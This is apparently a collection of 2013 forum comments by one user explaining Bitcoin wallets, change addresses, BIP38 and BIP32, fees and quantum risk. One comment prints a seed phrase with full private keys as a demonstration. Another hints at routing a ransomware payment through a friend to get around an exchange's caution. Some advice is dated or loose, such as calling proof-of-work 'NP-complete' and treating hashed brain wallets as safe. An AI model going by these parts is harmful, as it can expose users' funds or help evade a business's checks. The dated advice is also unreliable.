If you're talking about your every-day wallet with only relatively small amounts of Bitcoin, using a password protected (encrypted) wallet should be good enough as long as the password is hard to guess/bruteforce. Because it's encrypted it would be pretty safe to backup anywhere e.g. flash drive, Dropbox, Mega etc. If you're using a wallet like Electrum or Armory, you don't even really need to backup a file. It's just a seed phrase that can be used to regenerate all the addresses contained in the wallet.
If you're talking about safeguarding large amounts (savings) you should search here or Google for Cold Storage, Paper Wallet or brain wallet.

Currently transaction fees are hard-coded into the clients and only get updated as new versions are released. When the last version of bitcoin-qt was release a few months ago, 0.0001 was reasonable. Since the price has exploded since then, it's looking a little on the heavy side.
They're currently working on making the transaction fee dynamic so it won't be a problem in the future. Fees will be determined by several factors based on the current state of the network.
Despite what some articles and guide say, Bitcoin really was never built for true micropayments i.e. for fractions of a cent. But there are off-chain solutions that can provide that. input.io (RIP), Coinbase and other shared wallets are examples.
And yes, LTC has the same problems since it's basically a clone of BTC.

BIP38 just adds an extra layer of protection to your paper wallets. Without it, if anyone finds your paper wallet, they have the key and can immediately spend it. With BIP38 the key is protected by a password.

Yes you would definitely want to create a new wallet before transferring back. If you kept the same wallet it would continue to use those pre-generated addresses that are already compromised.
You wouldn't need two computers, you could just swap the two wallet.dat files around a bit. Or use a different user account on your computer.
Alternatively you could generate the new address using bitaddress.org or something like it, transfer to it, create a new wallet then import this address into it.
@_date: 2013-10-24 04:45:55
Did you use a slightly out of date backup of your wallet or something? Sounds weird that it added an address that you've used before, but this can happen when you restore from an old backup. The bitcoin-qt client generates addresses in blocks of 100 or so in advance, and pulls from this pool when you add addresses.
But that shouldn't matter much and I don't think you've screwed yourself. If nothing new is showing on that address it sounds like VirtEx just hasn't sent it yet, or it hasn't propagated to the network yet.

No, as others have said, the blockchain is public and needs to be for Bitcoin to function. That's the whole point.
However there are steps you can take to increase your privacy. If you use Bitcoin the way it was intended, you would never re-use addresses and change should always be sent to a new address. This has the effect of spreading your 'wealth' across many addresses and make it harder to trace your transactions.
This is how clients like bitcoin-qt, Electrum and Armory work, but others like Multibit and Blockchain.info tend to use only one address (or at most a few) for all your transactions.
@_date: 2013-11-21 09:30:57
Transaction fees will gradually replace the block reward as the incentive to mine. But transaction fees do not add to the money supply, they are collected from bitcoins already in existence. Block rewards are brand new coins and they're the only thing that increases the number of coins, and will become 0 by 2140. At that point, transaction fees will be the only incentive to mine.

I can't be bothered looking at the calculation right now, but just wanted to point out that the hash rate is irrelevant when talking about this. Those ASICs are only good at one thing: mining. Creating private keys, generating the ECC public key and Bitcoin addresses are outside their capabilities, and it's a much more complicated process. You'd need some other metric to do your calculation, something like addressgens / second.
@_date: 2013-11-14 21:14:36
It's not deterministic. It's more like bitcoin-qt except it doesn't generate lots of change addresses so the number of keys/addresses a wallet contains is small. Every time you add a new receiving address you need to update your backup.

If you think it was an online wallet service, all I can suggest is searching through your emails from around that time to see if you have any welcome emails that might trigger some memories.
Also check this list: 
Sounds like you have no chance of recovering your wallet if you used an installed Bitcoin client since you've formatted many times. I think you'd probably remember if you installed anything. Back then I think it was pretty much only the offical bitcoin-qt client that was available.
I followed that outgoing 1 BTC transaction and got to this address in a few clicks:  which has $51 million and is thought to be connected to Silk Road. Not that it means anything since most addresses in existence can probably be traced back to Silk Road in some way. Especially back then when SR was probably a much larger proportion of total transactions.

Your wallet's probably not corrupted, that wouldn't stop Bitcoin from loading .. it would give you a clear error. I don't think there's any need to start transferring between wallets just yet.
Are there any errors? Or is it just the dreaded wheel of death? Sounds like the upgrade messed with the installation somehow.
Whatever you do, you should backup wallet.dat to an external source *right now* if you haven't already.

Most browsers trust PositiveSSL as a CA but Android is a bit fussy and has a shorter list of trusted CAs. The site needs to install the intermediate cert that will allow Android to see that the actual root CA is trusted. They didn't do step 2 from here:

By that 'logic' every stock in existence is a Ponzi scheme. Definitions matter. The gold rush during the 1800s made many early miners rich while most later miners lost out or made very little. Is gold a Ponzi?
The price would drop if they were stupid enough to sell it all at once, but would likely bounce back over time. For every seller, there has to be a buyer .. it's the circle of life. Nobody's running off with any cash, it's a closed system.


If initiating a chargeback is the first thing you do after receiving damaged goods, then you're a customer nobody would want. Contact the merchant, arrange an exchange or a refund. Legit companies will happily arrange something rather than suffer the bad PR or possible lawsuits.
There's no doubt lack of buyer protection is something that needs workarounds for some kinds of purchases, but the current protections we have come at significant cost and are forced on everybody with no opt-out.

Using Shor's algorithm it's theoretically possible for a quantum computer to work out the private key from its public key much faster than a normal computer - not instantly, but potentially orders of magnitudes faster. If this became reality, it would put addresses that have previously been spent from at risk. It's only these addresses that have had their public key published, as it is only needed when spending. 
If you're following best practices of not re-using addresses, you're safe from all (known) quantum attacks because the public key hasn't been published and the addresses are protected by SHA-256 and RIPEMD-160 which have no quantum vulnerabilities. Elliptic curve crypto, SHA and RIPEMD would all need to be cracked at the same time, which is incredibly unlikely.
Similarly, since mining is all about SHA-256 hashing, it's also safe.
People think quantum computers are able to calculate anything almost instantly, but in reality they're only good at a subset of problems, and actually slower than normal processors for others.

OP, you realise you're still relying on computer randomness here right? The underlying, unencrypted private key is generated by your computer. All you're doing is encrypting it with a ridiculously hard password, which only comes into playif an attacker ever finds your BIP38 key. If the real private key has bad randomness, it's still vulnerable to attack.

Pretty much yeah. Even if they did maintain your balance on a particular address(es) assigned to you, they still have the private keys and control of your funds, so it makes little difference.
Using a pool of addresses lets them transparently "back up" a percentage of their holdings to cold storage among other things. If you want something more open you could try blockchain.info or Coinkite (not free). There are others that I can't recall at the moment (maybe BIPS?)
Relevant: 
@_date: 2013-11-20 23:08:55
Quantum computers aren't magical machines that allow you to calculate *anything* instantly. They merely make *some* types of calculations orders of magnitudes faster than current CPUs, but other types are the same or even slower. They're very good at finding common factors, primes etc which is a problem for some forms of crypto. As said, there are already alternatives that use algorithms that quantum computers can't exploit.
There are no (currently known) vulnerabilities of SHA256 hashing that would make a quantum computer any faster than a normal CPU. Thus bitcoin mining is mostly safe since it's all about hashing. Also this means that addresses that haven't been spent from are safe because addresses are the public key hashed multiple times.
The only quantum vulnerability is with addresses that have previously been spent from and still have a balance. This means the public key has been published to the blockchain, and using Shor's algorithm it's theroetically possible for a quantum computer to work out the private key much faster than a normal computer. This is one reason why not re-using addresses is best practice (the main reason is privacy).

What's the address you sent to?
@_date: 2013-11-27 18:17:05
Depends on the wallet software you're using. bitcoin-qt, Electrum and Armory work like jenya described, always sending change to a new address. But others like Multibit and blockchain.info just send the change back to the original address.
Best practice says that you shouldn't reuse addresses. The main reason is privacy. Consider the case where you start with an address, and always send the change back to that address. You would end up having pretty much all your funds on one address. Anyone you transact with would be able to see your entire net worth just by looking at the sending address. They would also be able to see every other transaction you've made using that address. Tracing your entire Bitcoin history would be trivial.
Now say we use new addresses for change. Over time this will have the side effect of spreading your funds across many addresses. Now people you do business with can only see what was stored on that single address, and won't know your entire balance. Also to an outside observer, it's harder to tell which part of the transaction is change, so it's harder to track.
    1 (A) =&gt; 0.4 (B) + 0.6 (C)
Which part is the change? You can't tell. Although in reality, it sometimes is easy to tell which part is change if the amount gives a clue.
    1.234 (A) =&gt; 1 (B) + 0.234 (C)
It's fairly safe to assume that C is the change here. You can infer that A and C belong to the same person.

It's important to realise that with an online wallet, you don't really ever "own" the addresses. They are just a means for sending/receiving funds into your account. The company is free to do whatever they want with that address, send it to their main wallet, send to cold storage, whatever. As long as Virtex is still saying you have the correct balance that is all that matters.
This is pretty normal behaviour for most online wallets.

Shared wallets offer a degree of mixing, offchain transactions, green addresses, convenience to name a few things. By using a pool they can transparently maintain a hot wallet while holding the bulk of funds in cold storage. They're meant to abstract away all the "hard stuff" for convenience.

If it's an address that has never been spent from, cracking it would require SHA256, RIPEMD-160 and ECDSA crypto to be compromised all together (extremely unlikely). An address isn't the public key, it is the public key hashed multiple times using SHA and RIPEMD.
If the address has any outgoing transaction, then the actual public key would be known to all and open to any ECDSA vulnerabilities alone.
This is another reason for using change addresses instead of sending change back to the originating address (the other reason is for privacy) and for not re-using addresses when receiving. That way the public key is exposed but all the funds on the address are already spent so it's irrelevant.

To answer your question, brain wallets of the type you're talking about aren't a standard, and never will be a standard part of Bitcoin, so it's unlikely to ever be supported in a way a "normal" user could easily use.

What I meant was, ignoring the storage of A/B keys and C transactions, if they're all generated in the same way then they're equally likely to be cracked/exposed, so your method is just unnecessarily complicated and redundant. You'd get the same net effect by just splitting the funds equally between the 3 addresses. So what you're really trying to protect against is your backups being compromised .. is that right?

It's no different to a password-encrypted wallet.dat. If you choose to use the two password option, the private keys are effectively double-encrypted which is a bonus. But then that's two passwords to remember.
To gain access to your wallet, an attacker would need
1: To know your wallet ID, and no 2FA configured on the account. ALWAYS USE 2FA
2: Direct access to your computer, in which case it would probably be easier for them to just keylog your password
If they can do either of those, then yes they can attempt to brute force.

Correct. Traditional brain/paper wallets involve a single key-pair and you send to its address.
The only thing you're missing is that Electrum (and others like Armory) is a special beast. That 12-word phrase does not map directly to a single address/key pair. It is not as simple as hashing the string to get the private key like traditional brain wallets. Instead it is used as a seed value to generate a potentially endless chain of address/keys using the magic of some pretty amazing maths.
e.g. the phrase *those fist amaze fail fantasy clear slap ode size harmony impossible bomb* maps to
    i, address,                              privkey
    1, "1EmwrGfL2Snn5vjH5rYPf6h3cCiHQPaQca", "5K3Lp6RSqDCBEMNw7ha5a1v25FNsb1xWyM9brX8Xmz9XfQMLy6t"
    2, "1Mgwa64PpkfpgrhKXsYy2ASpejJwoRMRw3", "5JXjJWWdjJLeWLkKLQ5GSG9TGjA8u8yPJm7RRDnHthZTS2kkqw7"
    3, "15nLsxumZw7X41viX7HichXd8te6DSPZ55", "5Htuzf68DNwyZ63XRoLYMy7rL3Q7yesfNtCSHn7kcLtqqWiMK3c"
    4, "1DWpJF8k8fvneTUsfxH3rdt7DysLaqWMyB", "5HqPdtRZ3twj5DzphKTsw3JERAEfJRXSN9WSRx4PKdNc15CrW3N"
    5, "1Lt5qqoohCYqorpb39TqZmw2TweUU8aDAp", "5JSKEtcfDqdfVVoHqpQmRfzVvPW3Gea3XKqD3aHv3UUxtDXJiK5"

    ... continues indefinitely
You could send to any of those addresses, and if you later need to restore from the seed phrase, it will "rehydrate" the key chain and you'll have all your addresses and keys back. It's pretty cool.
bitaddress.org does not currently have any support for Electrum type wallets. You cannot convert the 12-word phrase directly to a key-pair. brainwallet.org does on the Chains tab:

No it doesn't make sense for something stored on your computer, it is only useful for auth between yourself and a third party.
For it to work, there is a shared secret (seed value) between you and the service. This is the code you use when setting up a new 2FA account, it's what's in the QR code. This is stored on both your phone and the server and is used later in the algorithm that generates new codes (on your phone) and the algorithm that verifies that the code you submit is valid (on the server).
So if you tried to do this with something on your own computer .. where do you store the seed? In the wallet? That would be pointless. You could encrypt the value, but then if they know your password they can decrypt it, so that's also pointless.
@_date: 2013-12-22 14:04:41
I don't think a valid comparison can be made. Even the claim that Bitcoin is faster than X supercomputers combined is dubious. All those ASICs can only do one thing: double-SHA256 hashing of an 80-byte payload. Give them anything else to do and they will fail miserably. 
They're not general-purpose CPUs, so can't be compared to normal computers. In the same way, they're immeasurably faster than a human at calculating double-SHA256, but that's literally all they can do.

It would be fairly easy to add, there are libraries for most popular languages and even plugins for some products. But 2FA doesn't help in cases where the database is compromised.
There's a shared secret between the client and server, which would have to be stored in the database along with the password hash. It's the same code you use when setting up a new 2FA account, it's what's in the QR code. If the attacker has it, they have everything they need to generate your 2FA codes. It's not possible to only store a hash of the code like you do with passwords because the server needs the full code to do the verification. Theoretically you could encrypt it, but then that's just security by obscurity. The decryption key would also need to be on the server somewhere, and if the attacker has full access then it doesn't really help.
The problem with the bitcointalk hack was never really about people being able to login as you. It's the fact that data was leaked and passwords potentially exposed, which would be bad if you were stupid enough to use the same password on more "valuable" sites (e.g. online wallets).

inb4 people saying nLockTime /edit: too late/
That can't be used to lock coins down. It is only for creating a transaction that's valid after a certain time/block number. It doesn't prevent funds being spent before that time. Future-dated transaction can't be added to the blockchain until after they are valid.
What you're talking about isn't currently part of the protocol, but there's no reason that it couldn't be added in the future.


I don't really follow the reasoning here. Wouldn't that just delay the inevitable? When the funds are unlocked, they are unleashed on the market in one hit instead of potentially gradually if they we free of any locks. 
I see value in adding locks to enforce savings targets, but that's about it.

Protip: if you want fast deposits, do it first thing in the morning.
They are currently having issues with the way NAB transaction reporting works. Apparently NAB only lets you see the first X transactions of each day (not certain on the number, but let's say 50). If you're one of those transactions, CoinJar can immediately see your deposit, but if you're after that they can't see it until the next day.
They've started using multiple NAB accounts to try to get around this problem, but it seems it has only worked to a point. It's important to take note of the actual bank account number now since they use multiple. If you've previously saved their bank details in your net banking, you might be sending to the wrong account and this will cause delays.

The only thing you need is a private key and its corresponding Bitcoin address. How you choose to put that onto paper is up to you, whether it's a pretty printout with QR codes and tamper-evident seals, or just writing/typing it out.
Once you have an address, you buy the BTC on the exchange and send it to this address.
Very important to understand this when it comes time to spend it: 
Generally unless you have a client that specifically handles paper wallets, you should always completely spend the full amount i.e. consider paper wallets as single-use only.

Forgot to mention the other benefit of not re-using addresses, but it's a very minor theoretical one.
When you spend from an address, its public key is published as part of the transaction. That *should* be fine in an ideal world, but if a vulnerability was ever found in Elliptic Curve Cryptography, or large-scale quantum computing becomes a reality, it's theoretically possible that the public key could be used to work out the private key in a way that's faster than brute force.
In this imaginary scenario, if you reuse addresses your funds could be at risk because your public key would be published in the blockchain (multiple times). But if you use change addresses, it wouldn't matter. Addresses that have been spent from would have zero balance, so there's nothing left to steal. Addresses that haven't been spent from would be safe because the public key hasn't been published. Addresses are the public key hashed using SHA256 and RIPEMD160 which are both safe from all known quantum attacks. So these addresses are only vulnerable if SHA, RIPEMD and EC crypto are all compromised at the same time. Which is pretty much impossible on top of impossible.

And yes there are plans in motion to deal with the problem. Lightweight clients are already available, and blockchain pruning is being investigated.

You could get your users to supply you with a BIP32 master public key. From this you can generate an infinite chain of receiving addresses. This feature is already implemented in Electrum, and also Armory I think.

1: Looks like from your question 5 you're almost there. When you choose backup, it shows a file dialog asking you where you want to backup the wallet.dat file. So choose a flash drive or where ever you want to back it up and save the wallet.dat there. Also when you first started Armory, it should have given you a seed phrase (bunch of letters) to write down. You can also restore your wallet from that at any time.
2: I think has already explained this.
3: You send to any of the addresses from 2
6: You want to backup to somewhere external. Not much point backing up to the same drive. If it dies then all is lost.

Yeah it will be a while before the ability to add transaction reference becomes widely supported.
Which leaves:
1) Maintain a list of addresses per client
2) Some kind of hack involving making the donation amount semi-unique. e.g. Allow donation amounts down to 3 decimal places, and use the remaining 5 to 'encode' a transaction reference of some kind.
3) Use BIP32 address generation.

It's default behaviour for privacy reasons. If you just have a single address and always send change back to it, then all of your funds are going to be kept on that single address, and your complete transaction history is easily traced. Anyone you do business with will also know your total net worth in theory.
If you send change to a new address each time, it's hard to tell which amount is change and which is the payment amount.
A(10BTC) -&gt; B(6BTC) + A(4BTC)
From this transaction it's obvious which part is the change.
A(10BTC) -&gt; B(6BTC) + C(4BTC)
To an outside observer, which amount is the change?

Nerdfact: It's actually up to the site you're entering the code on to decide how lenient to be. The time-based tokens work in 30-second blocks and when verifying the token you can code it to accept tokens from the past or future, to allow for devices that have incorrectly synched clocks, slow connections or just for convenience. It's a tradeoff between usability and security. It's common to accept a token from either side of the current, so a window of 90 seconds.

Here's an [example]( which [turned out to be a scam]( Happens all the time.

You can see on Sourceforge there are about 120 downloads for the hashes vs over 19,000 for the binaries, so yeah nobody uses them.
I agree, adding SSL would be a definite improvement but it's hard to say at what cost. They're using Github Pages for hosting which is free but doesn't support SSL. They'd have to move to "proper" hosting and host the binaries themselves instead of on Sourceforge.

The private key is just any random 256-bit number. The public key is generated from it using Elliptic Curve crypto. You now have a public/private keypair. The address is the public key hashed a few times using SHA-256 and RIPEMD-160 and encoded with a checksum to make it more human-friendly.
@_date: 2013-10-25 23:39:16
Yeah if all or most of the BTC was on a single address in the wallet, then a small spend would mean a lot of funds going to a change address. But addresses are pre-generated in blocks of 100 (by default) so it's likely the change address would already exist in both copies of the wallet. Assuming we're talking about a bitcoin-qt wallet.dat here.
Mostly irrelevant anyway. Based on the transactions coming into the fed's address, the funds were spread out over a LOT of addresses which is what I assumed. So either they have his wallet.dat or seed for a deterministic wallet.

If all it's asking for is an address, that's safe enough. No way to touch your funds with only that.
The blockchain.info app can do this by adding a 'watch address'. It's a lot nicer looking but it's a full-featured wallet app.
@_date: 2013-11-03 03:05:55
The 2^256 number is technically wrong too. Yes that's how many possible private keys there are, but there are only 2^160 addresses so that is the limiting factor (each address actually has many possible private keys). 2^160 is still monstrous though.

If your Macbook is connected to the internet, then no it's not offline is it?
You're only protected by the quality of your wallet password, and the trust you have that your computer has no trojans or viruses. Which is less likely on a Mac compared to Windows but not impossible.
A truly offline wallet would involve a different computer that has never, and will never, have a connection to any network.
@_date: 2013-10-30 22:39:50
2^160 possible addresses
2^256 possible private keys
Which means there are 2^96 possible private keys per address. This often surprises people because the simpler explanations of Bitcoin usually say that a private key maps directly to a single address, but that's not true. It maps directly to a single public key, but that is then hashed a couple of times to create the address. But don't let that worry you, the chance of a collision is still ridiculously small.

I don't think it works like that? From the BIP32 public key you can generate a deterministic chain of addresses. If everyone starts with the same pub key they will all generate the same set of addresses from it. It's not random.

Coinbase is a shared wallet. They give you an address so you can send to it and fund your account, but how they then store that is up to them. They internally maintain your balance, but behind the scenes they might be moving the BTC into cold storage, or it might form part of an outgoing transaction of another user. As long as your Coinbase account balance is correct, that's all that matters.

Out of interest, does POSTbillpay have an API, or did you have to scrape and simulate the form submission? I'm guessing the latter.

A tricky feature of ECDSA is that you can derive the public key from the signature itself. So the public key is calculated from the signature, and then checked to see if it matches the address.

Brain wallets of the type from brainwallet.org and bitaddress.org aren't any kind of official standard (and will never be). They only work because there's a generally accepted method of converting a string to a key i.e. SHA256(phrase) to create an uncompressed key. I don't know why brainwallet.org even has the compressed option there.
To answer your question, blockchain.info could ask whether it should use compressed or uncompressed, but generally it's assumed they should be uncompressed. Compressed keys are relatively new and not supported by a lot of wallets yet.

That's not entirely true (if you're truly paranoid). That they could store/send keys is one concern. Another is that the keys they generate aren't truly random but are generated in some deterministic way. This could be either be intentional or accidental (e.g. having a bad random number generator like the Android random).
But like you said, verify the code yourself or trust the community.

Altcoins generally have a different address space (via version prefix) so it shouldn't be possible.
I'm not sure at what point it would be rejected though. The client/exchange/wallet *should* be validating the address so it will fail before even hitting the network (QT client does this). I'm not 100% sure if an invalid address can make it to the blockchain, but my hunch says no.

Yup that string is an address. You could just use that address to receive funds as a merchant, but it wouldn't scale very well if you were receiving lots of payments.

As an individual, if a friend or anyone else needed to send you money, you'd give them that address to send to.

Look up Elliptic Curve Cryptography if you want to know the details.

Sounds like [BIP 32]( would work here but it's still not finalised and there are no wallets that support it yet. It allows for branches and offices in a hierarchy with a master key at the top.
You could do something similar in Electrum by using multiple wallets but you wouldn't be able to see everything together like in your screenshot. You would have to create multiple wallets (site1.dat, site2.dat, headoffice.dat) and switch between them. Each wallet would have its own seed phrase that you'd need to keep. You could add the headoffice receiving address to each site's contacts list to make it easy to transfer funds there.

My understanding of the event pages is that they won't prevent Chrome from closing and that's a major reason they were added to the API. If you're using the alarm API, during the time between checks your page will be unloaded and not actually be running, and won't prevent Chrome from shutting down (only a possible delay if it's in the middle of executing).

Addresses are just an encoded form of a 160-bit number, which is where there 2^160 figure is coming from. It's 160 because of the use of the RIPEMD-160 hashing function.
In encoded form, they can be anywhere between 27 and 34 characters depending on the number of leading zeros in the number, and also contain redundant data that shouldn't be included in your calculation e.g. the 1 or 3 prefix, and the last few characters are a checksum. They are base58-encoded, so it's 58 not 62 (0OIl characters are excluded).

Well I guess you could say that, but those other keys aren't technically valid. blockchain.info seems to be ignoring the checkbits, but most other tools would say they are invalid. I tried them in bitaddress.org and Electrum and they failed.
The last few chars aren't really part of the private key, they're just tacked on the end. The actual private key is encoded in the rest of the string. If you change those characters you'll get a different address.
@_date: 2013-11-17 20:12:51
You're right except 2^256 = ~10^78 which is quite a bit different :) Although it's really 2^160 that is the important number i.e. the number of addresses. There are potentially many private keys for a single address.

Technically right since you're talking about private keys, but the limiting factor is addresses which are limited to 2^160 = 10^38 which is slightly less than the number of atom in Earth - 10^40
This also means that for every address there's on average 2^96 private keys that 'unlock' it.
@_date: 2013-11-02 04:08:26
To clarify, only ECDSA is thought to be vulnerable to quantum computing but this doesn't really apply to mining which is all about SHA256 which is generally considered safe from quantum computing at this point.
Given a public key, quantum computing makes it *easier* (not easy) to calculate the private key. But the public key is only exposed if the address has been spent from. If nothing has been spent, all that is exposed is the address which is a SHA/RIPEMD hash of the public key which is safe from quantum attacks.

I think they're worrying about being complicit in the act of *paying the ransom*, not the initial crime. It doesn't apply in this case, but paying ransoms to kidnappers is actually illegal in some countries. Italy is one, and they take it to the extreme of freezing the assets of direct family members when a hostage situation occurs, so they can't even *think* of paying it. Banks would get in trouble if they knowingly facilitated the transaction. Pretty ridiculous in my opinion. If anything it gives more power to the kidnappers as the family would be hesitant to report it and involve police.

Possibly. For transactions that meet certain conditions, this is already possible (based on amount and "age" of the inputs). But to discourage spam, transaction fees need to be enforced in some cases. e.g. small amounts require a fee to discourage dust spam, and "young" coins need a fee to prevent someone just sending their funds backwards and forwards between their own addresses and clogging up the network.

I think the main reason for using a hash was to save space - 160 vs 520 bits. But addresses have the added bonus of being relatively quantum-safe. 
[Shor's algorithm]( theoretically allows a public key to cracked by a quantum computer orders of magnitude faster than brute force. But for SHA2/RIPEMD it can only be halved using [Grover's algorithm](

No mining doesn't really 'produce' Bitcoin. The Bitcoin is the reward given for the valuable work you've done securing the network. It can't be counted as the work itself.
re: verifying the work, each unit of work needs to be [NP-complete]( i.e. hard to compute, impossible to fake, but easy to verify. There's no point solving something if it takes everyone else a similar or any significant amount of work to check it's valid. Bitcoin's blocks can be verified near-instantly by even the most basic CPU, but it takes enormous amounts of processing to generate. The higher the hashrate is, the more secure the network is. Distributed computing problems like SETI/Folding are hard to verify as well as hard to calculate.
I should add to my list:
4) The work must not be able to be done in advance. You need to prevent stockpiling of pre-computed results. The proof of work needs to also contain proof that the work was done *right now* and against the transactions waiting to be included in the block.
Bitcoin solves this by making the previous block an input to the algorithm. So it ends up being a chain, with each subsequent block dependent on all before it. The longer the chain, the more 'secure' the blocks are.
Also 5) The work must never end. If you do something like protein folding, what happens when the search space is completed? When a cure is found? I guess there's always more problems to move on to, but each time a major breakthrough is encountered it would be a disruptive event.

BIP38 is still relatively new and not widely supported by wallet software. blockchain.info and Mycelium are the only wallets that support it that I'm aware of. If you import a BIP38 encrypted key, they will prompt for a password. Besides that, you will need to use bit2factor or bitaddress.org (Wallet details tab) to decode the actual private key and then import that into your wallet of choice.
As for the QR code, if you're not getting out what you put in, then obviously there's a problem. I haven't heard of littleidiot or Baseline, so I can't comment on which is at fault. I would be wary of using any online QR code generator myself. Although the key is encrypted, the less people that see it the better.
@_date: 2013-11-17 20:51:53
So I tried to calculate this, but hit a wall because the numbers are too huge to deal with.
Part of the calculation involves this: *log(2^160 / (2^160 - 10 billion))*. Because 10 billion is so much smaller than 2^160, it effectively equates to `log(1)` which is zero. I tried to calculate it using an arbitrary-precision library, but after about 20mins of calculating my computer ran out of memory :( You'd basically need a supercomputer to calculate it. 
It's possible to attack the problem from the opposite end though. For a 50% chance of a single collision, you'd need 1.4x10^24 addresses aka 1,423,401,376,491,999,200,000,000 aka one septillion, four hundred twenty-three sextillion, four hundred one quintillion, three hundred seventy-six quadrillion, four hundred ninety-one trillion, nine hundred ninety-nine billion, two hundred million
90% collision chance with 2.59x10^24 addresses (almost twice as much)
5% = 3.87x10^23
0.000001% = 1.7x10^20
0.00000000000001% = 18,014,398,509,481,984 (18 quadrillion)
That's as far as I could go using standard maths before the chance became 0.00. You can see where it is going though. To reach the point of even a tiny collision chance, you need a massive number of addresses.
@_date: 2013-11-30 14:43:40

@_date: 2013-10-10 15:23:52
IANAL, but I really don't think you have any legal liability here. Paying ransom even for the much more serious crime of kidnapping isn't illegal in Canada. But the fact that the user has made you aware of all the details does put you in a bit of an awkward position. 
To me, it would ultimately be a business and ethical decision. In the unlikely event that police are involved and some sort of legal action is taken, you may be called on to give evidence, so there's time and possibly legal expenses there. If he pays and doesn't get his files back, he could turn hostile against you. Doubt he'd have a legitimate case, but it's something to consider.
Ethically, enabling this transaction gives the fraudsters incentive to continue the scam, but on the flip side it helps your customer out of a bind assuming the ransom is honoured.
Perhaps suggest he contact a competitor, but tell him not to provide the background info. Or hint that he could try again through you via a friend/family member without the background info \*wink wink nudge nudge\*

You simply use [SHA-256]( hashing on the phrase to create the private key. It's a very well-documented industry standard that will be around forever.
Once you have the private key, the public key and address are derived from it. These steps are part of the Bitcoin protocol, also well-documented and not going anywhere. You can import a private key using the bitcoin-qt client and most others.
If you're talking about clients like Electrum that use a phrase as a seed for the entire wallet, that process is also well-documented: 
A well-crafted passphrase that is truly random is just as secure and safe as a "normal" generated key/address.
Regarding trusting a third-party generator like bitaddress.org or brainwallet.org, their source code is freely available. If you're not a coder and can't verify it yourself, then I guess your choices are to trust the devs in the community that say it's legit, or learn how to code :)

Did you include a transaction fee? How long did it take to confirm? Got a link to the tx?
Unless you got the address wrong (unlikely) you're not going to lose the BTC, they'll sort it out for you. But I don't think you'll be getting the $830 rate since that timed out.
When I've sold in the past, I transferred to my CoinJar wallet first and used that balance to withdraw.

You weren't really wrong. Check my comments above.
@_date: 2013-10-31 20:43:56
I think the fee is *just* under the minimum fee. The min fee is 0.0001 BTC per thousand bytes *or part thereof*. The tx is 34235 bytes which means 35 x 0.0001 (need to round up), which for this transaction should be 0.0035 instead of 0.0034
It's a big transaction (in size not value) with 190 inputs of mostly tiny amounts.

@_date: 2013-11-14 20:30:24
Depends which wallet you're using.
If you're using bitcoin-qt (official client), it maintains a pool of 100 pre-generated addresses. So if you backup your wallet.dat, it's good for 100 or so transactions. After that it will start to use addresses that aren't in your original backup.
If you're using Electrum or Armory, they're deterministic wallets which means every single address they'll ever use can be derived from the seed that you see when you first create the wallet. So all you need to backup is that phrase and it's good forever.

Do you need pub keys of existing addresses in your wallet? Which wallet and OS?
Or is it ok to generate completely new keys? If so you can download bitaddress.org and add this after line 7858
    + "\",\"" + key.getPubKeyHex()
So it should look like 
    bulkWallet.csv.push((bulkWallet.csvRowLimit - bulkWallet.csvRowsRemaining + bulkWallet.csvStartIndex)

I agree, BIP70 seems like a cumbersome solution for this. Each payday, you would need to tell your employer how to pay you. It would be like your boss asking every week: "What are your bank account details again?". Seems like a logistical nightmare.
With BIP32 you would be trusting your employer to spread the payment in a way that achieves privacy instead of defining that yourself, but that's probably a reasonable thing to ask. Wallet software could automate the splitting pretty easily and transparently.
I wonder how transaction fees will affect the viability of this? It involves either a single large transaction (many outputs) or many small transactions. It could add up unless transaction fees decrease a lot in the future.
@_date: 2013-10-25 17:27:38

@_date: 2013-11-25 16:26:41
If you're accepting bank transfers, I would recommend only accepting from Real name verified members: 
If the name attached to the transfer doesn't match then I would initiate a dispute and go from there. That's assuming you can see the sender's name on the transaction .. you can where I'm from but I don't know if that's standard.
The safest option would be to only accept direct deposits, but that would limit your customer base to people that could be bothered visiting the bank.

The transactions that are in your second screenshot, did you actually make those? If so, then nothing to worry about.

What you're talking about is a redenomination which only really works for centralised currencies. It would be a logistical nightmare for a decentralised currency.  It's a massive undertaking that requires the cooperation of an entire country led by its government and really involves replacing one currency with another (new notes, with a changeover exchange period). 
Sure, all the clients and miners could agree to update at the same time, but think how this would affect people in the real world. That widget advertised on Amazon for 2BTC .. is that old BTC or new BTC? Fuck that noise.
BTC is divisible right down to 8 decimal places. Satoshi did this for a reason. I can't imagine how you could possibly think Satoshi would be for a redenomination. If he was, it would have been built into the protocol. We have units down to satoshis if we need them without going through any of the BS you're talking about.

Didn't mean to be an arse, just being skeptical based on past experiences with posts like these. Your posts had all the signs of being false, I was just asking for clarification.
There does seem to be something strange going on with your address though. The latest transaction is trying to spend an unconfirmed transaction, which also seems to be a double-spend from way back in March, around the time of the blockchain fork. It could be related to 
That transaction is never going to confirm. I would suggest contacting blockchain.info support.

You can't have both unfortunately. There's a risk/reward decision to be made. A merchant dealing with small transactions can relatively safely accept a 0/unconfirmed transaction. Yes it's theoretically possible for the customer to then double-spend, but the effort required is significant and wouldn't be worth it for small amounts.
If you're dealing with large amounts of money, obviously you'd need to wait for however many confirmations you feel comfortable with.

Addresses will start with a 1 but all you can do with that is see the balance and transactions. Private keys will probably start with a 5 and they can be imported into pretty much any wallet.

Theoretically possible, but as you say counter to the ideals of the community. It would set a bad precedent.
Also Cryptolocker could just move to using more random addresses (e.g. 1 per infection) instead of reusing known addresses as it currently seems to do. Would be impossible to keep track unless each victim reported "their" address.

Not sure what your "lol" mean, but he's right. You're not risking any funds by revealing the transaction, just perhaps some privacy since it will reveal addresses and amounts involved.
We can't really help you without seeing the transaction. There are many reasons for that failure code including outputs being more than the inputs, input already spent etc. All I can recommend is looking at debug.log, it might reveal more info.

Not only are they optimised for double-SHA256, they're highly tuned to Bitcoin in other ways. They can only hash an 80-byte payload consisting of the block hash and a nonce which gets incremented each attempt. They literally can't do anything outside of those parameters.

The fee is less than recommended for a transaction of that size, so its priority is low. How was it sent?
It's currently 0.0001 per kilobyte, and this one is over 3kB so it should be more than 0.0003 fee. Looks like whatever sent it has rounded down instead of up.

Worth noting that curecoin still has mining that's exactly the same as Bitcoin to secure the blockchain. They split the reward between miners and folders.

It's not just ECC, it's SHA-256 and RIPEMD-160 as well and they would all need to be broken at once to have any significant effect. If ECC was broken, the only funds at risk are addresses that have previously been spent from but still have a balance. If you're following best practices of not re-using addresses, it won't be a problem for you.

VENTURE capital firm Blackbird Ventures and a handful of individual investors have made the country's first major bitcoin investment, funnelling $500,000 into Melbourne-based start-up CoinJar.
